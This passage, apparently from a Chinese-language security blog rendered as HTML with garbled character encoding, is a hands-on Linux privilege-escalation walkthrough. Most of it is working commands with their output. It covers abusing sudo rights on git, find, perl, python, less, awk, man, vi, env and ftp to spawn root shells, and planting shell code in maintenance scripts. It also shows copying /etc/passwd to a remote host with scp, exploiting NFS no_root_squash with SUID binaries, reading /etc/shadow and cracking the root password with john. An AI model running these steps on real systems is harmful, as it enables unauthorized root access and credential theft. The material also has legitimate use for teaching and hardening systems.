    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin

ç”¨æˆ· <span class="token builtin class-name">test</span> å¯ä»¥åœ¨ localhost ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="sudoææƒ" tabindex="-1"><a class="header-anchor" href="#sudoææƒ" aria-hidden="true">#</a> sudoææƒ</h4><ul><li><p>sudoï¼šä»¥rootæƒé™å»è¿è¡Œä¸€ä¸ªå‘½ä»¤</p></li><li><p>/etc/sudoersæ–‡ä»¶ï¼šæ˜¯sudoæƒé™çš„é…ç½®æ–‡ä»¶ï¼Œå¯é…ç½®ç”¨æˆ·æ¥å†³å®šæ˜¯å¦å¯ä»¥è¿è¡Œç›¸å…³å‘½ä»¤ã€‚å¯ä»¥ä½¿ç”¨å‘½ä»¤visudoæˆ–è€…vim /etc/sudoersæ¥ç¼–è¾‘å®ƒã€‚</p></li></ul><img src="/assets/1-35567951.jpg"><h5 id="git" tabindex="-1"><a class="header-anchor" href="#git" aria-hidden="true">#</a> git</h5><ul><li>å¦‚æœåœ¨/etc/sudoersæ–‡ä»¶ä¸­ï¼Œç”¨æˆ·å…è®¸ä½¿ç”¨sudoå‘½ä»¤æ¥æ‰§è¡Œgitå‘½ä»¤ï¼Œåˆ™å­˜åœ¨ææƒçš„å¯èƒ½</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>èƒŒæ™¯
/etc/sudoersæ–‡ä»¶
<span class="token builtin class-name">test</span>    <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span>       /usr/bin/git
æŸ¥çœ‹sudoæƒé™
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
åŒ¹é… %2<span class="token variable">$s</span> ä¸Š %1<span class="token variable">$s</span> çš„é»˜è®¤æ¡ç›®ï¼š
    <span class="token operator">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, <span class="token assign-left variable">env_keep</span><span class="token operator">=</span><span class="token string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin

ç”¨æˆ· <span class="token builtin class-name">test</span> å¯ä»¥åœ¨ localhost ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> /usr/bin/git
ææƒè¿‡ç¨‹
<span class="token number">1</span>.<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">git</span> <span class="token builtin class-name">help</span> config
<span class="token number">2</span>.åœ¨å¸®åŠ©ç•Œé¢ç›´æ¥è¾“å…¥
<span class="token operator">!</span>/bin/bash
<span class="token number">3</span>.ææƒæˆåŠŸï¼š
<span class="token punctuation">[</span>root@localhost man<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root

æˆ–ï¼š

<span class="token number">1</span>.<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">git</span> <span class="token parameter variable">-p</span> <span class="token builtin class-name">help</span>
<span class="token number">2</span>.åœ¨å¸®åŠ©ç•Œé¢ç›´æ¥è¾“å…¥
<span class="token operator">!</span>/bin/bash
<span class="token number">3</span>.ææƒæˆåŠŸ
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="find-1" tabindex="-1"><a class="header-anchor" href="#find-1" aria-hidden="true">#</a> find</h5><ul><li>åˆ©ç”¨-execå‚æ•°æ¥æ‰“å¼€ä¸€ä¸ªbashã€‚</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>èƒŒæ™¯
<span class="token builtin class-name">test</span>    <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span>	/usr/bin/git,/usr/bin/perl,/usr/bin/python,/usr/bin/less,/usr/bin/awk,/usr/bin/vi,/usr/bin/find,/usr/bin/man,/bin/env
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> <span class="token builtin class-name">test</span> çš„å¯†ç ï¼š
åŒ¹é… %2<span class="token variable">$s</span> ä¸Š %1<span class="token variable">$s</span> çš„é»˜è®¤æ¡ç›®ï¼š
    <span class="token operator">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, <span class="token assign-left variable">env_keep</span><span class="token operator">=</span><span class="token string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin

ç”¨æˆ· <span class="token builtin class-name">test</span> å¯ä»¥åœ¨ localhost ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> /usr/bin/git, /usr/bin/perl, /usr/bin/python, /usr/bin/less,
        /usr/bin/awk, /usr/bin/vi, /usr/bin/find, /usr/bin/man, /bin/env

ææƒè¿‡ç¨‹
<span class="token number">1</span>.<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">find</span> / <span class="token parameter variable">-exec</span> <span class="token string">&quot;/bin/bash&quot;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="perl" tabindex="-1"><a class="header-anchor" href="#perl" aria-hidden="true">#</a> perl</h5><ul><li>ä½¿ç”¨-eå‚æ•°æ¥æŒ‡å®šè¦è¿è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œç„¶ååˆ©ç”¨execå‚æ•°æ¥æ‰“å¼€ä¸€ä¸ªbash</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ææƒè¿‡ç¨‹
<span class="token number">1</span>.<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> perl <span class="token parameter variable">-e</span> <span class="token string">&#39;exec &quot;/bin/bash&quot;;&#39;</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="python" tabindex="-1"><a class="header-anchor" href="#python" aria-hidden="true">#</a> python</h5><ul><li>-cå‚æ•°å¯ä»¥åœ¨å‘½ä»¤è¡Œæ‰§è¡Œpythonä»£ç ï¼Œptyåº“æ˜¯ä¸€ä¸ªä¼ªç»ˆç«¯åº“ï¼Œå®ƒçš„spawnä¼šè°ƒç”¨æŒ‡å®šçš„ç¨‹åºã€‚</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ææƒè¿‡ç¨‹
<span class="token number">1</span>.<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> python <span class="token parameter variable">-c</span> <span class="token string">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="less" tabindex="-1"><a class="header-anchor" href="#less" aria-hidden="true">#</a> less</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ææƒè¿‡ç¨‹
<span class="token number">1</span>.ä½¿ç”¨sudo lessæµè§ˆæ–‡ä»¶å†…å®¹
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token number">123456</span> <span class="token operator">&gt;</span> <span class="token number">123</span>.txt
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">ls</span>
<span class="token number">123</span>.txt
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">less</span> <span class="token number">123</span>.txt
<span class="token number">2</span>.åœ¨æµè§ˆæ–‡ä»¶å†…å®¹æ—¶ï¼Œå¯é€šè¿‡è¾“å…¥<span class="token operator">!</span>bashåå›è½¦ï¼Œä¼šè·å¾—ä¸€ä¸ªrootæƒé™çš„shell
<span class="token operator">!</span>bash
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="awk" tabindex="-1"><a class="header-anchor" href="#awk" aria-hidden="true">#</a> awk</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ææƒè¿‡ç¨‹
<span class="token number">1</span>.<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">awk</span> <span class="token string">&#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</span>
sh-4.2<span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="man" tabindex="-1"><a class="header-anchor" href="#man" aria-hidden="true">#</a> man</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ææƒè¿‡ç¨‹
<span class="token number">1</span>.éšæ„æµè§ˆä¸€ä¸ªå‘½ä»¤æ‰‹å†Œ
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">man</span>
æ‚¨éœ€è¦ä»€ä¹ˆæ‰‹å†Œé¡µï¼Ÿ
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">man</span> <span class="token function">vim</span>
<span class="token number">2</span>.ç›´æ¥è¾“å…¥<span class="token operator">!</span>bash
<span class="token operator">!</span>bash
<span class="token punctuation">[</span>root@localhost zh_CN<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="vi" tabindex="-1"><a class="header-anchor" href="#vi" aria-hidden="true">#</a> vi</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ææƒè¿‡ç¨‹
<span class="token number">1</span>.è¿›å…¥viçš„é»˜è®¤é¡µ
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">vi</span>
<span class="token number">2</span>.è¾“å…¥:<span class="token operator">!</span>bash
:<span class="token operator">!</span>bash
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="å¦‚æœå­˜åœ¨è¿ç»´è„šæœ¬" tabindex="-1"><a class="header-anchor" href="#å¦‚æœå­˜åœ¨è¿ç»´è„šæœ¬" aria-hidden="true">#</a> å¦‚æœå­˜åœ¨è¿ç»´è„šæœ¬</h5><ul><li>å¯é€šè¿‡åŠ å…¥æ¶æ„ä»£ç æ‰“å¼€ä¸€ä¸ªrootæƒé™æƒé™çš„bash</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>.shæ–‡ä»¶
<span class="token comment">#! /bin/bash</span>
/bin/bash

.pyæ–‡ä»¶
<span class="token comment">#! /usr/bin/python</span>
<span class="token function">import</span> os
os.system<span class="token punctuation">(</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">)</span>

.cæ–‡ä»¶
<span class="token comment">#include&lt;stdio.h&gt;</span>
<span class="token comment">#include&lt;unistd.h&gt;</span>
<span class="token comment">#include&lt;sys/types.h&gt;</span>

int <span class="token function-name function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	setuid<span class="token punctuation">(</span>geteuid<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>
	system<span class="token punctuation">(</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token builtin class-name">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="env" tabindex="-1"><a class="header-anchor" href="#env" aria-hidden="true">#</a> env</h5><ul><li>é€šè¿‡envç¯å¢ƒå˜é‡æ¥è·å–rootæƒé™</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ææƒè¿‡ç¨‹
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">env</span> /bin/bash
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="ftp" tabindex="-1"><a class="header-anchor" href="#ftp" aria-hidden="true">#</a> ftp</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ææƒè¿‡ç¨‹
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">ftp</span>
ftp<span class="token operator">&gt;</span> <span class="token operator">!</span>/bin/bash
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="scp" tabindex="-1"><a class="header-anchor" href="#scp" aria-hidden="true">#</a> scp</h5><ul><li>scpæ˜¯ä¸€ä¸ªå®‰å…¨å¤åˆ¶æ–‡ä»¶å‘½ä»¤ï¼Œå®ƒæ— æ³•è·å–ä¸€ä¸ªshellï¼Œä½†å¯ä»¥å¤åˆ¶ä¸€äº›æ•æ„Ÿæ–‡ä»¶å¦‚/etc/passwdï¼Œ/etc/shadowç­‰ï¼Œå¯ä»¥å°†è¿™äº›æ–‡ä»¶å¤åˆ¶åˆ°æœ¬åœ°æ¥è¿›è¡Œæš´åŠ›ç ´è§£ã€‚</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#å°†/etc/passwdæ–‡ä»¶å¤åˆ¶åˆ°192.168.1.1ä¸»æœºçš„/rootç›®å½•ä¸‹
sudo scp /etc/passwd root@192.168.1.1:/root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="é»‘åå•æƒ…å†µ" tabindex="-1"><a class="header-anchor" href="#é»‘åå•æƒ…å†µ" aria-hidden="true">#</a> é»‘åå•æƒ…å†µ</h5><ul><li>å¦‚æœ/etc/sudoersæ–‡ä»¶ç¦ç”¨äº†å‘½ä»¤ï¼Œå¦‚findï¼Œä½†è‡ªèº«çš„sudoæƒé™æ˜¯allã€‚é‚£ä¹ˆå¯ä»¥å°†findå¤åˆ¶åˆ°å¦å¤–çš„è·¯å¾„ï¼Œç„¶åå†æ‰§è¡Œã€‚</li></ul><h4 id="nfsé…ç½®ä¸å½“ææƒ" tabindex="-1"><a class="header-anchor" href="#nfsé…ç½®ä¸å½“ææƒ" aria-hidden="true">#</a> NFSé…ç½®ä¸å½“ææƒ</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ç¯å¢ƒæ­å»ºï¼š
<span class="token number">1</span>.yum <span class="token function">install</span> <span class="token parameter variable">-y</span> nfs-utils rpcbind
<span class="token number">2</span>.vim /etc/exports
/shagou *<span class="token punctuation">(</span>rw,no_root_squash<span class="token punctuation">)</span>
<span class="token comment"># /shagouæ˜¯è¦æŒ‚è½½çš„ç›®å½•ï¼Œ*ä»£è¡¨å…è®¸è¿æ¥çš„ä¸»æœºï¼Œrwæ˜¯è¯»å†™æƒé™ï¼Œno_root_squashä»£è¡¨å®¢æˆ·ç«¯å…è®¸ä»¥rootæƒé™è®¿é—®nfsã€‚</span>
<span class="token number">4</span>.å¯åŠ¨æœåŠ¡ã€
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># export</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># systemctl stop firewalld</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># systemctl restart rpcbind</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># systemctl restart nfs</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ææƒè¿‡ç¨‹ï¼š
<span class="token number">1</span>.æŸ¥çœ‹nfsæœåŠ¡å™¨å…±äº«äº†ä»€ä¹ˆç›®å½•
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># showmount -e 192.168.1.133</span>
Export list <span class="token keyword">for</span> <span class="token number">192.168</span>.1.133:
/shagou *

<span class="token number">2</span>.å°†æœåŠ¡å™¨å…±äº«çš„ç›®å½•æŒ‚è½½åˆ°å¦ä¸€å°æœºçš„æœ¬åœ°
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># mkdir bendi</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># mount -t nfs 192.168.1.133:/shagou ./bendi</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># cd ./bendi/</span>
<span class="token punctuation">[</span>root@localhost bendi<span class="token punctuation">]</span><span class="token comment"># cp /bin/bash ./</span>
<span class="token punctuation">[</span>root@localhost bendi<span class="token punctuation">]</span><span class="token comment"># chmod +s bash</span>
<span class="token punctuation">[</span>root@localhost bendi<span class="token punctuation">]</span><span class="token comment"># ls -al</span>
æ€»ç”¨é‡ <span class="token number">944</span>
drwxrwxrwx. <span class="token number">2</span> root root     <span class="token number">18</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> 09:53 <span class="token builtin class-name">.</span>
dr-xr-x---. <span class="token number">6</span> root root    <span class="token number">273</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> 09:53 <span class="token punctuation">..</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">964536</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> 09:53 <span class="token function">bash</span>
<span class="token number">4</span>.è®©æœåŠ¡å™¨çš„ä¸€ä¸ªæ™®é€šç”¨æˆ·å»æ‰§è¡Œbashæ–‡ä»¶
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ ./bash <span class="token parameter variable">-p</span>
bash-4.2<span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="nano" tabindex="-1"><a class="header-anchor" href="#nano" aria-hidden="true">#</a> nano</h5><ul><li>é€šè¿‡nanoè¯»å–shadowæ–‡ä»¶</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ææƒè¿‡ç¨‹ï¼š
<span class="token number">1</span>.åœ¨å¦ä¸€å°æœºå™¨ä¸Šå¤åˆ¶nanoåˆ°nfsæœåŠ¡å™¨ä¸­ï¼Œå¹¶æ·»åŠ suid
<span class="token punctuation">[</span>root@localhost bendi<span class="token punctuation">]</span><span class="token comment"># cp /usr/bin/nano ./</span>
<span class="token punctuation">[</span>root@localhost bendi<span class="token punctuation">]</span><span class="token comment"># chmod +s nano</span>
<span class="token punctuation">[</span>root@localhost bendi<span class="token punctuation">]</span><span class="token comment"># ls -al</span>
æ€»ç”¨é‡ <span class="token number">1148</span>
drwxrwxrwx. <span class="token number">2</span> root root     <span class="token number">30</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> 09:56 <span class="token builtin class-name">.</span>
dr-xr-x---. <span class="token number">6</span> root root    <span class="token number">273</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> 09:53 <span class="token punctuation">..</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">964536</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> 09:53 <span class="token function">bash</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">205904</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> 09:56 <span class="token function">nano</span>

<span class="token number">2</span>.è¯»å–/etc/shadowæ–‡ä»¶ï¼Œç„¶åå°†æƒ³è¦ç ´è§£çš„ç”¨æˆ·å¤åˆ¶åˆ°å¦å¤–çš„æ–‡ä»¶ä¸­ã€‚
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ ./nano <span class="token parameter variable">-p</span> /etc/shadow

<span class="token number">3</span>.åˆ©ç”¨johnçˆ†ç ´å¯†ç 
â”Œâ”€â”€<span class="token punctuation">(</span>rootã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
â””â”€<span class="token comment"># john shadow.txt</span>
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>sha512crypt, crypt<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token variable">$6</span>$ <span class="token punctuation">[</span>SHA512 <span class="token number">256</span>/256 AVX2 4x<span class="token punctuation">]</span><span class="token punctuation">)</span>
Cost <span class="token number">1</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">5000</span> <span class="token keyword">for</span> all loaded hashes
Will run <span class="token number">4</span> OpenMP threads
Proceeding with single, rules:Single
Press <span class="token string">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
Almost done: Processing the remaining buffered candidate passwords, <span class="token keyword">if</span> any.
Proceeding with wordlist:/usr/share/john/password.lst
<span class="token number">123456</span>           <span class="token punctuation">(</span>root<span class="token punctuation">)</span>
1g <span class="token number">0</span>:00:00:02 DONE <span class="token number">2</span>/3 <span class="token punctuation">(</span><span class="token number">2023</span>-03-12 <span class="token number">10</span>:23<span class="token punctuation">)</span> <span class="token number">0</span>.4310g/s 1512p/s 1512c/s 1512C/s <span class="token number">123456</span><span class="token punctuation">..</span>crawford
Use the <span class="token string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably

<span class="token comment">#å¦‚æœç»“æœå·²å­˜åœ¨è¦åŠ --showæ˜¾ç¤º</span>
â”Œâ”€â”€<span class="token punctuation">(</span>rootã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
â””â”€<span class="token comment"># john --show shadow.txt</span>
root:123456::0:99999:7:::

<span class="token number">1</span> password <span class="token builtin class-name">hash</span> cracked, <span class="token number">0</span> left
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 